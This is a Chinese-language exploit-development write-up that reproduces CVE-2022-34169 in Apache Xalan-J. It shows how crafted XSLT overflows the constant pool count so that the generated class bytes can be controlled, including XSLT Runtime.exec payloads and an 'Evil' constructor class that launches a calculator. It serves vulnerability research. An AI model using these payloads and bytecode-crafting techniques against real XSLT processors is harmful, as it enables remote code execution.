**作者：thanat0s@360高级攻防实验室  
原文链接：<http://noahblog.360.cn/xalan-j-integer-truncation-reproduce-cve-2022-34169/>**

## 0x00 前言

这是第一次遇到与 Java Class
字节码相关的漏洞([CVE-2022-34169](https://bugs.chromium.org/p/project-zero/issues/detail?id=2290&continueFlag=5f0a104405cabc4e1e6027013da73bfc))，由于漏洞作者提供的利用脚本未能执行成功，所以根据漏洞描述结合自己的理解尝试进行利用构造，在深入分析并成功构造出
Payload 的过程中，也是加深了对 Java
字节码的了解，虽然漏洞作者在利用脚本中提供了一些注释信息，但对于完整理解整个利用的构造过程是不够的，因此这里对 Payload 构造过程进行一个详细的记录。

## 0x01 漏洞概述

> [XSLT(Extensible Stylesheet Language
> Transformations)](https://zh.wikipedia.org/zh-sg/XSLT) 是一种可以将 XML
> 文档转换为其他格式(如 HTML)的标记语言
>
> [Xalan-J](https://xml.apache.org/xalan-j/) 是 Apache 开源项目下的一个 XSLT 处理器的 Java
> 版本实现

首先看到漏洞作者提供的漏洞描述：

> Xalan-J uses a JIT compiler called XSLTC for translating XSLT stylesheets
> into Java classes during runtime. XSLTC depends on the Apache Byte Code
> Engineering (BCEL) library to dynamically create Java class files
>
> As part of the compilation process, constants in the XSLT input such as
> Strings or Numbers get translated into Java constants which are stored at
> the beginning of the output class file in a structure called the constant
> pool
>
> Small integers that fit into a byte or short are stored inline in bytecode
> using the bipush or sipush instructions. Larger ones are added to the
> constant pool using the cp.addInteger method
    
    
    // org.apache.bcel.generic.PUSH#PUSH(org.apache.bcel.generic.ConstantPoolGen, int)
    public PUSH(final ConstantPoolGen cp, final int value) {
        if ((value >= -1) && (value <= 5)) {
            instruction = InstructionConst.getInstruction(Const.ICONST_0 + value);
        } else if (Instruction.isValidByte(value)) {
            instruction = new BIPUSH((byte) value);
        } else if (Instruction.isValidShort(value)) {
            instruction = new SIPUSH((short) value);
        } else {
            instruction = new LDC(cp.addInteger(value));
        }
    }

> As java class files only use 2 bytes to specify the size of the constant
> pool, its max size is limited to 2**16 - 1 entries
>
> BCELs internal constant pool representation uses a standard Java Array for
> storing constants and does not enforce any limits on its length. When the
> generated class file is serialized at the end of the compilation process the
> array length is truncated to a short, but the complete array is written out：
    
    
    // org.apache.bcel.classfile.ConstantPool#dump
    public void dump( final DataOutputStream file ) throws IOException {
        file.writeShort(constant_pool.length); // 对 constant_pool.length 进行了 short 截断
        for (int i = 1; i < constant_pool.length; i++) { // 依旧写入了 constant_pool.length 个数的常量
            if (constant_pool[i] != null) {
                constant_pool[i].dump(file);
            }
        }
    }

根据提供的描述信息可以知道，Xalan-Java 即时编译器(JIT) 会将传入的 XSLT 样式表使用 BCEL 动态生成 Java Class
字节码文件(Class 文件结构如下)，XSLT 样式表中的 `字符串(String)` 以及 `> 32767` 的数值将存入到字节码的
`常量池表(constant_pool)` 中，漏洞产生的原因在于 Class
字节码规范中限制了常量池计数器大小(`constant_pool_count`) 为 `u2 类型(2个无符号字节大小)`，所以 BCEL 在写入 `>
0xffff` 数量的常量时需要进行截断处理，但是通过上面 `dump()` 方法中的代码可以看到，BCEL 虽然对
`constant_pool_count` 数值进行了处理，但实际依旧写入了 `> 0xffff` 数量的常量，因此大于
`constant_pool_count` 部分的常量最终将覆盖 `access_flags` 及后续部分的内容

    
    
    ClassFile {
        u4             magic;                                // 魔术，识别 Class 格式 
        u2             minor_version;                        // 副版本号(小版本)
        u2             major_version;                        // 主版本号(大版本)
        u2             constant_pool_count;                  // 常量池计数器：用于记录常量池大小
        cp_info        constant_pool[constant_pool_count-1]; // 常量池表：0 位保留，从 1 开始写，所以实际常量数比 constant_pool_count 小 1
        u2             access_flags;                         // 类访问标识
        u2             this_class;                           // 类索引
        u2             super_class;                          // 父类索引
        u2             interfaces_count;                     // 接口计数器
        u2             interfaces[interfaces_count];         // 接口索引集合
        u2             fields_count;                         // 字段表计数器
        field_info     fields[fields_count];                 // 字段表
        u2             methods_count;                        // 方法表计数器
        method_info    methods[methods_count];               // 方法表
        u2             attributes_count;                     // 属性计数器
        attribute_info attributes[attributes_count];         // 属性表
    }

## 0x02 环境搭建

  * JDK测试版本: 1.8.0_301、11.0.9

根据作者的描述，使用的是 `Xalan-J 2.7.2` 版本，并通过如下命令生成 `.class` 文件

    
    
    // https://xml.apache.org/xalan-j/commandline.html
    java -jar /usr/share/java/xalan2.jar -XSLTC -IN test.xml -XSL count.xsl -SECURE  -XX -XT
    
    -XSLTC (use XSLTC for transformation)
    -IN inputXMLURL
    -XSL XSLTransformationURL
    -SECURE (set the secure processing feature to true)
    -XX (turn on additional debugging message output)
    -XT (use translet to transform if possible)

为了方便调试，替换为相应的 Java 代码，新建 Maven 项目，添加如下依赖及代码：

  * pom.xml

    
    
    <!-- https://mvnrepository.com/artifact/xalan/xalan -->
    <dependency>
      <groupId>xalan</groupId>
      <artifactId>xalan</artifactId>
      <version>2.7.2</version>
    </dependency>

  * org/example/TestMain.java

    
    
    package org.example;
    
    import org.apache.xalan.xslt.Process;
    
    public class TestMain {
        public static void main(String[] args) throws Exception {
            String xsltTemplate = "/tmp/xalan_test/select.xslt";
            Process.main(new String[]{"-XSLTC", "-IN", "/tmp/xalan_test/source.xml", "-XSL", xsltTemplate, "-SECURE", "-XX", "-XT"});
        }
    }

  * /tmp/xalan_test/source.xml

    
    
    <?xml version="1.0"?>
    <doc>Hello</doc>

  * /tmp/xalan_test/select.xslt

    
    
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template>
    </xsl:template>
    </xsl:stylesheet>

运行 `TestMain` 后即可生成 `select.class` 文件，反编译后得到如下 Java 代码：

    
    
    import org.apache.xalan.xsltc.DOM;
    import org.apache.xalan.xsltc.TransletException;
    import org.apache.xalan.xsltc.runtime.AbstractTranslet;
    import org.apache.xml.dtm.DTMAxisIterator;
    import org.apache.xml.serializer.SerializationHandler;
    
    public class select extends AbstractTranslet {
        public DOM _dom;
        protected static String[] _sNamesArray = new String[0];
        protected static String[] _sUrisArray = new String[0];
        protected static int[] _sTypesArray = new int[0];
        protected static String[] _sNamespaceArray = new String[0];
    
        public void buildKeys(DOM var1, DTMAxisIterator var2, SerializationHandler var3, int var4) throws TransletException {
        }
    
        public void topLevel(DOM var1, DTMAxisIterator var2, SerializationHandler var3) throws TransletException {
            int var4 = var1.getIterator().next();
        }
    
        public void transform(DOM var1, DTMAxisIterator var2, SerializationHandler var3) throws TransletException {
            this._dom = this.makeDOMAdapter(var1);
            int var4 = var1.getIterator().next();
            this.transferOutputSettings(var3);
            this.topLevel(this._dom, var2, var3);
            var3.startDocument();
            this.applyTemplates(this._dom, var2, var3);
            var3.endDocument();
        }
    
        public void template$dot$0(DOM var1, DTMAxisIterator var2, SerializationHandler var3, int var4) {
        }
    
        public final void applyTemplates(DOM var1, DTMAxisIterator var2, SerializationHandler var3) throws TransletException {
            int var4;
            while((var4 = var2.next()) >= 0) {
                switch(var1.getExpandedTypeID(var4)) {
                case 0:
                case 1:
                case 9:
                    this.applyTemplates(var1, var1.getChildren(var4), var3);
                    break;
                case 2:
                case 3:
                    var1.characters(var4, var3);
                case 4:
                case 5:
                case 6:
                case 7:
                case 8:
                case 10:
                case 11:
                case 12:
                case 13:
                }
            }
    
        }
    
        public select() {
            super.namesArray = _sNamesArray;
            super.urisArray = _sUrisArray;
            super.typesArray = _sTypesArray;
            super.namespaceArray = _sNamespaceArray;
            super.transletVersion = 101;
        }
    }

## 0x03 XSLT 安全

XSLT 因为其功能的强大导致历史中出过一些漏洞，如下两种 Payload 在被 Java XSLT 处理器解析时就会存在代码执行的问题：

    
    
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
        <xsl:template match="/">
          <xsl:variable name="rtobject" select="rt:getRuntime()"/>
          <xsl:variable name="process" select="rt:exec($rtobject,'touch /tmp/pwn')"/>
          <xsl:variable name="processString" select="ob:toString($process)"/>
          <xsl:value-of select="$processString"/>
        </xsl:template>
    </xsl:stylesheet>
    
    
    <xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
        <xsl:template match="/">
        <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'touch /tmp/pwn')" xmlns:Runtime="java.lang.Runtime"/>
        </xsl:template>
    </xsl:stylesheet>

所以首先尝试使用上述 Payload
进行测试，发现相关的操作已经被限制了，这其中可能会存在一些绕过方式，但并不是本次所需要关心的，这次主要在意的是作者如何通过常量池覆盖后续字节码结构，实现的
RCE 操作

![img](https://images.seebug.org/content/images/2022/09/09/1662693061000-1mjlun.png-w331s)

## 0x04 控制常量池计数器

> 常量池：用于存放编译时期生成的各种 `字面量` 和 `符号引用`，这部分内容将在类加载后进入方法区/元空间的 `运行时常量池` 中存放
>
> 常量池计数器：从 `1` 开始，也即 `constant_pool_count=1` 时表示常量池中有 `0` 个常量项，第 `0` 项常量用于表达
> `不引用任何一个常量池项目` 的情况，常量池对于 Class 文件中的 `字段` 和 `方法` 等解析至关重要

可以使用 Java 自带的工具 `javap` 查看字节码文件中的常量池内容：`javap -v select.class`

![img](https://images.seebug.org/content/images/2022/09/09/1662693061000-2gsuww.png-w331s)

也可以使用 [Classpy](https://github.com/zxh0/classpy) GUI
工具进行查看，该工具在点击左侧相应字段信息时会在右侧定位出相应的十六进制范围，在构造利用时提供了很大的帮助

但是这两个工具无法对首部结构正确的畸形字节码文件进行解析(只输出正确结构的部分)，并且未找到合适的解析工具

![img](https://images.seebug.org/content/images/2022/09/09/1662693063000-3eyann.png-w331s)

常量池表中具体存储的数据结构如下，根据 `tag` 标识来决定后续字节码所表达的含义：

![img](https://images.seebug.org/content/images/2022/09/09/1662693064000-4rreuk.png-w331s)

![img](https://images.seebug.org/content/images/2022/09/09/1662693064000-5dwrky.png-w331s)

![img](https://images.seebug.org/content/images/2022/09/09/1662693064000-6yhkfa.png-w331s)

尝试在 `select.xslt` 文件中添加 `` 并生成 Class 文件：

    
    
    <xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template>
    <AAA/>
    </xsl:template>
    </xsl:stylesheet>

通过反编译后的 Java 代码中可以看到新增了 `AAA` 字符串

    
    
    public class select extends AbstractTranslet {
        ...
        public void template$dot$0(DOM var1, DTMAxisIterator var2, SerializationHandler var3, int var4) {
            var3.startElement("AAA");
            var3.endElement("AAA");
        }
        ...
    }

对应到常量池中实际将增加 `CONSTANT_String_info` 和 `CONSTANT_utf8_info` 两项，其中
`#092(CONSTANT_utf8_info)` 中存储着字面量 `AAA`，`#093(CONSTANT_String_info)` 的
`string_index` 则指向 `AAA` 字面量所处的下标

![img](https://images.seebug.org/content/images/2022/09/09/1662693065000-7ojqtw.png-w331s)

![img](https://images.seebug.org/content/images/2022/09/09/1662693065000-8pfpyq.png-w331s)

为了节省空间，对于相同的常量在常量池中只会存储一份，所以如下内容所生成的 Class 文件中的常量池计数器值依旧为 `139`

    
    
    <xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template>
    <AAA/>
    <AAA/>
    <AAA/>
    <AAA/>
    <AAA/>
    </xsl:template>
    </xsl:stylesheet>

需要注意的是 `AA` 和 `AAA` 实际属于不同的常量，将得到的常量池计数器值为：`139+2=141`，因此：
**使用不同的字符串可以`字符串数量x2` 的形式增加常量池计数器的值**

    
    
    <xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template>
    <AAA/>
    <AA/>
    </xsl:template>
    </xsl:stylesheet>

![img](https://images.seebug.org/content/images/2022/09/09/1662693065000-9keszl.png-w331s)

![img](https://images.seebug.org/content/images/2022/09/09/1662693066000-10btvvc.png-w331s)

然而在实际测试的过程中发现，通过如下方式增加常量，随着 `n` 不断的增加，所花费的时间也越来越大

    
    
    <xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template>
    <t1/>
    <t2/>
    ...
    <tn/>
    </xsl:template>
    </xsl:stylesheet>

解决方法是使用 `增加属性` 替代 `增加元素` 的方式增加常量池( **每增加一对属性，常量池+4** )

    
    
    <xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template>
    <t1 t2='t3' t4='t5' ... tn-1='tn'/>
    </xsl:template>
    </xsl:stylesheet>

原因在于每新增一个 `元素(element)` 都将有 `translate()` 方法调用的开销，而新增 `属性` 只是增加一个
`Hashtable#put()` 方法调用，因此将大大减少执行时间

  * org.apache.xalan.xsltc.compiler.SyntaxTreeNode#translateContents

![img](https://images.seebug.org/content/images/2022/09/09/1662693066000-11rrfpw.png-w331s)

  * org.apache.xalan.xsltc.compiler.LiteralElement#checkAttributesUnique

![img](https://images.seebug.org/content/images/2022/09/09/1662693066000-12giavg.png-w331s)

除了可以通过字符串的形式增加常量池，根据漏洞作者的提示可以通过 `方法调用` 的形式添加 `数值类型` 的常量(数值需要 `> 32767`
才会存储至常量池表中)，如通过调用 `java.lang.Math#ceil(double)` 方法传入 `double` 数值类型，因为 `double`
属于基本数据类型，因此只会增加一个 `CONSTANT_Integer_info` 数据结构，所以 **每增加一个 double 数值，常量池+1**

    
    
    <xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template>
    <xsl:value-of select='ceiling(133801)'/>
    <xsl:value-of select='ceiling(133802)'/>
    <xsl:value-of select='ceiling(133803)'/>
    </xsl:template>
    </xsl:stylesheet>

![img](https://images.seebug.org/content/images/2022/09/09/1662693066000-13lwleq.png-w331s)

## 0x05 Class 结构图

这里先展示一下整个 Class 文件最终构造的结构图，接下来将针对各个部分进行说明

![](https://images.seebug.org/content/images/2022/09/df9a73f7-2a7f-407d-8bda-27dd830e53e3.jpg-w331s)

## 0x06 利用构造说明

想详细了解 Java Class 字节码文件结构的可以参考链接：[The Class File
Format](https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html#jvms-4.4)

通过字节码结构可以看到，`constant_pool_count & 0xffff` 截断后，大于 `constant_pool_count`
部分的常量池将覆盖后续内容，从而可以完全控制整个类的结构

    
    
    ClassFile {
        u4             magic;                                // 魔术，识别 Class 格式 
        u2             minor_version;                        // 副版本号(小版本)
        u2             major_version;                        // 主版本号(大版本)
        u2             constant_pool_count;                  // 常量池计数器：用于记录常量池大小
        cp_info        constant_pool[constant_pool_count-1]; // 常量池表：0 位保留，从 1 开始写，所以实际常量数比 constant_pool_count 小 1
        u2             access_flags;                         // 类访问标识
        u2             this_class;                           // 类索引
        u2             super_class;                          // 父类索引
        u2             interfaces_count;                     // 接口计数器
        u2             interfaces[interfaces_count];         // 接口索引集合
        u2             fields_count;                         // 字段表计数器
        field_info     fields[fields_count];                 // 字段表
        u2             methods_count;                        // 方法表计数器
        method_info    methods[methods_count];               // 方法表
        u2             attributes_count;                     // 属性计数器
        attribute_info attributes[attributes_count];         // 属性表
    }
    
    
    cp_info {
        u1 tag;
        u1 info[];
    }

### access_flags & this_class

首先需要能够理解的是 **access_flags 第一个字节对应常量池的 tag** ，而 `tag` 值将决定后续的数据结构(查阅前面常量池结构表)

![img](https://images.seebug.org/content/images/2022/09/09/1662693066000-15zvjvh.png-w331s)

`access_flags` 的值决定了类的访问标识，如是否为 `public` ，是否为 `抽象类` 等等，如下为各个标识对应的 `mask` 值，当
`与操作值 != 0` 时则会增加相应的修饰符

![img](https://images.seebug.org/content/images/2022/09/09/1662693067000-16wyacq.png-w331s)

在决定 `access_flag` 第一个字节的值(后续使用x1,x2..代替)之前，需要知道编译后的字节码会被进行怎样的处理，可以看到最终将得到
`TemplatesImpl` 对象，其中 `_bytecodes` 即为 XSLT 样式表编译后的字节码内容，熟悉 Java 反序列化漏洞的应该对
`TemplatesImpl` 类不陌生，之后 `newTransformer()` 方法调用将会触发 `defineClass()` 及
`newInstance()` 方法的调用

  * org.apache.xalan.xslt.Process#main

![img](https://images.seebug.org/content/images/2022/09/09/1662693067000-17uffrq.png-w331s)

![img](https://images.seebug.org/content/images/2022/09/09/1662693067000-18oeubu.png-w331s)

![img](https://images.seebug.org/content/images/2022/09/09/1662693067000-19peemh.png-w331s)

由于 `defineClass()` 过程无法触发类 `static{}` 方法块中的代码，所以需要借助 `newInstance()` 调用的过程来触发
`static{}`、`{}`、`构造函数` 方法块中的恶意代码，因此 **由于需要实例化类对象，所以类不能为接口、抽象类，并且需要被 public
修饰** ，所以 `access_flags` 需满足如下条件：

  * access_flags.x1 & 任意修饰符 == 0
  * access_flags.x2 & ACC_PUBLIC(0x01) != 0

这里选择设置 `access_flags.x1 = 0x08`，不选择 `access_flags.x1 = 0x01` 的原因在于字面量 `length`
变化会影响到 `bytes` 的数量，所以一旦发生变动，后续内容就会需要跟着变动，不太好控制

![img](https://images.seebug.org/content/images/2022/09/09/1662693067000-20iauqf.png-w331s)

而 `access_flags.x2` 的值这里将其设置为 `0x07`，而不使用 `0x01`
的原因在于，其值的设定会影响到常量池的大小，根据后续构造发现常量池大小需要满足 `> 0x0600(1536)` 大小，这部分后续也会再进行说明

通过写入 `tag = 6` 的 `double` 数值常量(`java.lang.Math#ceil(double)`)，可以实现连续控制 8
个字节内容，所以 `this_class.x2 = 0x06`，根据前面可知，`this_class` 是一个指向常量池的 `常量池索引`，所以为了使得
`截断后的常量池最小`，所以这个值需要尽可能的小，由于 `0x0006` 已经占用了，所以最终确定值为 `this_class = 0x0106(262)`

![img](https://images.seebug.org/content/images/2022/09/09/1662693068000-21pzvap.png-w331s)

在确认了 `access_flags` 的值后，接下来考虑的是如何进行设置，回看到如下这个图，`String` 类型的 `string_index`
指向前一项 `Utf8` 字面量的下标，因此 `tag = 8` `string_index = 0x0701` 则表示前一项是下标为 `0x0701 =
#1793` 的 `Utf8` 字面量，当前下标为 `#1794`，所以得出结论是 `access_flags` 之前应有 `1794(包含第 0 项)`
个常量，则 `constant_pool_count` 截断后的值固定为 `1794(0x0702)`，`access_flags.x2`
间接控制了常量池的大小

![img](https://images.seebug.org/content/images/2022/09/09/1662693068000-22wrixx.png-w331s)

根据字节码规范要求，`this_class` 应指向一个 `CONSTANT_Class_info` 结构的常量，也即如下图中 `Class` 对应的下标
`#0006`

> The value of the this_class item must be a valid index into the
> constant_pool table. The constant_pool entry at that index must be a
> CONSTANT_Class_info structure (§4.4.1) representing the class or interface
> defined by this class file.

![img](https://images.seebug.org/content/images/2022/09/09/1662693069000-23jvmes.png-w331s)

但是这里并不能选择常量池已有的这些 `Class常量`，原因在于这些 `Class常量` 是 XSLT 解析的过程中会使用到的类，而字节码最终会被
`defineClass()` 加载为 Class，将会导致类冲突问题

解决方法是通过如下方法调用的方式加载一些 XSLT 解析过程不会引用的类，因为类是懒加载的，只有在被使用到的时候才会被加载进 JVM，所以
`defineClass()` 调用时并不会存在
`com.sun.org.apache.xalan.internal.lib.ExsltStrings`，从而解决了类冲突的问题，之后通过在其之前填充一些常量，使得
`this_class = 0x0106(#262)` 刚好指向 `(Class):
com/sun/org/apache/xalan/internal/lib/ExsltStrings` 即可

    
    
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template>
    <!-- 填充: <t t1='t2'...> -->
    <xsl:value-of select="es:tokenize(.)" xmlns:es="com.sun.org.apache.xalan.internal.lib.ExsltStrings"/>
    </xsl:template>
    </xsl:stylesheet>

![img](https://images.seebug.org/content/images/2022/09/09/1662693069000-24rhopv.png-w331s)

### super_class

`super_class` 同样也需要指向 `CONSTANT_Class_info` 类型索引，并且因为 `TemplatesImpl`
的原因依旧需要继承 `org.apache.xalan.xsltc.runtime.AbstractTranslet` 抽象类，所以直接指向 `#0006`
即可(位置固定不变)

> For a class, the value of the super_class item either must be zero or must
> be a valid index into the constant_pool table. If the value of the
> super_class item is nonzero, the constant_pool entry at that index must be a
> CONSTANT_Class_info structure (§4.4.1) representing the direct superclass of
> the class defined by this class file.

![img](https://images.seebug.org/content/images/2022/09/09/1662693070000-25qosrx.png-w331s)

![img](https://images.seebug.org/content/images/2022/09/09/1662693070000-26swjkx.png-w331s)

因为主要目的是控制方法，并通过 `newInstance()` 触发恶意代码，所以对于 `接口` 和 `字段` 都可以不需要，直接设置为 `0` 即可：

  * interfaces_count = 0x0000
  * fields_count = 0x0000

### method_count

经测试发现 `static{}` 方法块(`<clinit>`)执行必须要有合法的构造函数 `<init>` 存在，所以直接通过 `<init>`
触发恶意代码即可，除此之外还需要借助一个方法的 `attribute` 部分进行一些脏字符的吞噬(后续解释)，所以类中至少需要 2
个方法，经测试发现：在字节码层面，非抽象类可以不实现抽象父类的抽象方法，所以可以不实现抽象父类 `AbstractTranslet` 的
`transform` 方法，设置 `method_count = 0x0002` 即可

### methods[0]

首先看到 method_info 结构：

    
    
    method_info {
        u2             access_flags;                 # 方法的访问标志
        u2             name_index;                   # 方法名索引
        u2             descriptor_index;             # 方法的描述符索引
        u2             attributes_count;             # 方法的属性计数器
        attribute_info attributes[attributes_count]; # 方法的属性集合
    }

根据前面的构造可以看到 `methods[0].access_flags.x1 = 0x06`，根据访问标识表可知当前方法为 `抽象(0x06 & 0x04
!= 0)` 方法，无法包含方法体，所以这也是至少需要存在两个方法的原因，但同时也发现一个问题： **在字节码层面，抽象方法是可以存在于非抽象类中的**

  * `methods[0].access_flags.x2 = 0x01`：因为该方法不会被使用，所以直接给个 ACC_PUBLIC 属性即可

![img](https://images.seebug.org/content/images/2022/09/09/1662693070000-27xjoou.png-w331s)

![img](https://images.seebug.org/content/images/2022/09/09/1662693071000-28mbixk.png-w331s)

  * `methods[0].name_index(Utf8)`：选择指向了父类抽象方法名 `transferOutputSettings`，实际指向任何合法 `Utf8` 常量均可
  * `methods[0].descriptor_index(Utf8)`：选择指向了 `transferOutputSettings` 方法描述符，实际指向任何合法 `Utf8` 方法描述符均可

![img](https://images.seebug.org/content/images/2022/09/09/1662693071000-29vqstr.png-w331s)

`methods[0].attributes_count` 表示当前方法体中 `attribute` 的数量，每个 `attribute`
都有着如下通用格式，根据 `attribute_name_index` 来决定使用的是哪种属性格式(如下表)

    
    
    attribute_info {
        u2 attribute_name_index;     # 属性名索引
        u4 attribute_length;         # 属性个数
        u1 info[attribute_length];   # 属性集合
    }

![img](https://images.seebug.org/content/images/2022/09/09/1662693071000-30kcvbb.png-w331s)

这里主要关注 `Code` 属性，其中存储着方法块中的字节码指令

    
    
    Code_attribute {
        u2 attribute_name_index;                     # 属性名索引
        u4 attribute_length;                         # 属性长度
        u2 max_stack;                                # 操作数栈深度的最大值
        u2 max_locals;                               # 局部变量表所需的存储空间
        u4 code_length;                              # 字节码指令的长度
        u1 code[code_length];                        # 存储字节码指令
        u2 exception_table_length;                   # 异常表长度
        {   u2 start_pc;
            u2 end_pc;
            u2 handler_pc;
            u2 catch_type;
        } exception_table[exception_table_length];   # 异常表
        u2 attributes_count;                         # 属性集合计数器
        attribute_info attributes[attributes_count]; # 属性集合
    }

以如下代码为例查看相应的 Code 属性结构

    
    
    package org.example;
    
    public class TestMain {
        public TestMain(){
            try{
                System.out.println("test");
            }catch (Exception e){
            }
        }
    }

可以看到构造函数 `<init>` 中 `attributes_count = 1` 说明只包含一个属性，`attribute_nam_index`
指向常量池 `#10(Utf8) Code`，表示当前为 `Code` 属性，`code_length` 表示字节码指令长度为 `17`，`code`
部分则存储了具体的字节码指令

![img](https://images.seebug.org/content/images/2022/09/09/1662693072000-31usdvu.png-w331s)

![img](https://images.seebug.org/content/images/2022/09/09/1662693074000-32bjooi.png-w331s)

这里需要注意的是： **如果 attribute_name_index 没有指向合法的属性名，将使用通用格式来进行数据解析** ，因此可以利用这个特性来吞噬
`下一个 double 常量的 tag 标识`，因此这里设定

  * `methods[0].attributes_count = 0x0001`：只需一个属性即可完成吞噬目的
  * `attribute_name_index(Utf8) = 0x0206`：前面已经将 `0x0106` 设置为了 `Class` 类型，所以这里尽量指向更低位的常量池，所以选择使用 `0x0206`，同时需要注意的是 `attribute_name_index` 需指向合法的 `Utf8` 类型常量，所以还需要通过填充的方式确保指向的类型正确
  * `attribute_length = 0x00000005`：属性值设定为 5 并使用 `0xAABBCCDD` 填充满一个 `double` 常量，这样可以刚好可以吞噬掉下一个 `double` 常量的 `tag` 标识，使得下一个 `method[1].access_flags` 可以直接通过 `double` 来进行控制

![img](https://images.seebug.org/content/images/2022/09/09/1662693074000-33hrnan.png-w331s)

### methods[1]

接下来看到第二个方法 `methods[1]`，首部这 8 个字节就可直接通过一个 `double` 数值类型进行控制，这里将构造所需的构造函数方法 ``：

  * `access_flags = 0x0001`：需要给与 `PUBLIC` 属性才能通过 `newInstance()` 实例化

  * `name_index`：需要指向 `的 `Utf8` 常量池下标，这里通过` 代码提前添加 `` 常量，否则只有编译到构造函数方法时才会添加该常量

  * `descriptor_index`：需指向 `()V` 的 `Utf8` 常量池下标

  * `attributes_count = 0x0003`：这里将使用 3 个`attribute`构造出合法的方法块：  
attributes[0]：用于吞噬 `double` 常量的 `tag`  
attributes[1]：用于构造 `Code` 属性块  
attributes[2]：用于吞噬后续垃圾字符

![img](https://images.seebug.org/content/images/2022/09/09/1662693075000-34efzrh.png-w331s)

### methods[1].attributes[0]

可以看到 `methods[1].attributes[0].attribute_name_index.x1 = 0x06`，因为
`attribute_name_index` 是指向常量池的索引，所以需要常量池需要 `> 1536(0x0600)`，这就是前面
`access_flags.x2 >= 0x06` 的原因

使用同样的方式，通过控制 `attributes[0].attribute_length` 吞噬掉下一个 `double` 常量的 `tag`

![img](https://images.seebug.org/content/images/2022/09/09/1662693075000-35idyes.png-w331s)

这样就可以完全控制 `attributes[1].attribute_name_index`，使其指向 `Utf8 Code` 常量，后续数据将以
`Code_attribute` 结构进行解析

![img](https://images.seebug.org/content/images/2022/09/09/1662693075000-36kvjrx.png-w331s)

  * `attribute_length` 和 `code_length` 都得在 `code[]` 部分内容确定后进行计算
  * `max_stack = 0x00FF`：操作数栈深度的最大值，数值计算，方法调用等都需要涉及，稍微设置大一些即可
  * `max_locals = 0x0600`：局部变量表所需的存储空间，主要用于存放方法中的局部变量，因为不会涉及使用大量的局部变量，所以`0x0600` 完全够用了
  * `exception_table_length = 0x0000`：异常表长度，经测试发现， **在字节码层面，java.lang.Runtime.exec() 方法调用实际可以不进行异常捕获** ，所以这里也将其设置为 0
  * `attributes_count = 0x0000`：`Code` 属性中的内部属性，用于存储如 `LineNumberTable` 信息，因为不涉及所以将其设置为 0 即可

这里提前看到 `methods[1].attributes[2].attribute_name_index` 字段，因为 `attributes[2]`
的作用也是用于吞噬后续的垃圾字符，所以可以和 `methods[0].attributes[0].attribute_name_index` 一样设置为
`0x0206`，所以 **`code` 尾部需要有 3 个字节是位于 `double` 常量首部的**

### methods[1].code

接着看到最重要的字节码指令构造部分，可以通过 [List of Java bytecode
instructions](https://en.wikipedia.org/wiki/List_of_Java_bytecode_instructions)
获取相关的 Opcode

并非需要每个字节挨个自行进行构造，可以直接编写一个恶意方法，然后提取其中 code 字节码指令部分即可，编写如下代码并获取其字节码指令：

    
    
    package org.example;
    
    import org.apache.xalan.xsltc.DOM;
    import org.apache.xalan.xsltc.TransletException;
    import org.apache.xalan.xsltc.runtime.AbstractTranslet;
    import org.apache.xml.dtm.DTMAxisIterator;
    import org.apache.xml.serializer.SerializationHandler;
    
    public class Evil extends AbstractTranslet {
        public Evil() {
            try{
                Runtime runtime = Runtime.getRuntime();
                runtime.exec("open -a calculator");
            }catch (Exception e){
            }
        }
    
        @Override
        public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException {
        }
    
        @Override
        public void transform(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler) throws TransletException {
        }
    }

![img](https://images.seebug.org/content/images/2022/09/09/1662693077000-37liiqe.png-w331s)

![img](https://images.seebug.org/content/images/2022/09/09/1662693077000-38eqjdq.png-w331s)

根据上面的字节码指令即可构造出如下代码结构，其中有几点需要注意：

  * 空操作可以使用 `nop(0x00)` 指令
  * 对于 `tag = 6` 所对应的指令 `iconst_6` 需要配对使用 `istore_1` 指令
  * 不使用 `istore_0` 的原因在于， **局部变量表 0 位置存储着`this` 变量引用**
  * 使用 `ldc_w` 替换 `ldc`，可以扩大常量池加载的范围
  * 因为可以不涉及异常表，所以 `goto` 指令可以去除
  * 根据前面的说明，末尾的 `double` 常量需要占用首部 3 个字节

![img](https://images.seebug.org/content/images/2022/09/09/1662693077000-39dfxyz.png-w331s)

对于 `Methodref` 方法引用类型，可以使用如下方法调用的方式进行添加

    
    
    <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'open -a calculator')" xmlns:Runtime="java.lang.Runtime"/>

但是这里唯一存在问题的是：如何添加 `AbstractTranslet.` 方法引用，这里需要看到
`org.apache.xalan.xsltc.compiler.Stylesheet#translate()` 方法，构造函数总是最后才进行编译，添加的
`AbstractTranslet.` 方法引用总是位于常量池末尾，所以这将导致截断后的常量池中很难包含 `MethodRef:
AbstractTranslet.` 方法引用

![img](https://images.seebug.org/content/images/2022/09/09/1662693077000-40nlylr.png-w331s)

![img](https://images.seebug.org/content/images/2022/09/09/1662693077000-41hywrk.png-w331s)

然而构造函数 `<init>` 中必须要调用 super() 或 this() 方法，否则会产生如下错误：

![img](https://images.seebug.org/content/images/2022/09/09/1662693078000-42qkmyy.png-w331s)

通过邮件咨询漏洞作者如何解决这个问题，漏洞作者给出了如下方案：

![img](https://images.seebug.org/content/images/2022/09/09/1662693078000-43ekxlw.png-w331s)

